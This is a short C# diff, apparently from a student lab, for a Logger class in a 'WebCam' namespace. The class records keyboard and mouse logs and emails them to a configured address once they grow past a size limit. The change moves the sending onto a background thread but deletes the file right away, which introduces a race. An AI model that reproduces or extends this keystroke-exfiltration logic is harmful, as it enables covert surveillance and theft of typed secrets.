@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Threading;
 
 namespace WebCam
 {
@@ -8,6 +9,7 @@ namespace WebCam
         private readonly Settings _config;
         private const string KeyboardLog = "./keyboard.log";
         private const string MouseLog = "./mouse.log";
+        private string filepathToSend;
 
         public Logger(Settings config)
         {
@@ -36,9 +38,15 @@ namespace WebCam
         {
             if (new FileInfo(filePath).Length > _config.FileSize && !string.IsNullOrEmpty(_config.Email))
             {
-                new EmailManager().SendEmail(_config.Email, "Laba 8 Log", filePath);
+                filepathToSend = filePath;
+                new Thread(Sender).Start();
                 new FileInfo(filePath).Delete();
             }
+        }
+
+        private void Sender()
+        {
+            new EmailManager().SendEmail(_config.Email, "Laba 8 Log", filepathToSend);
         }
     }
 }
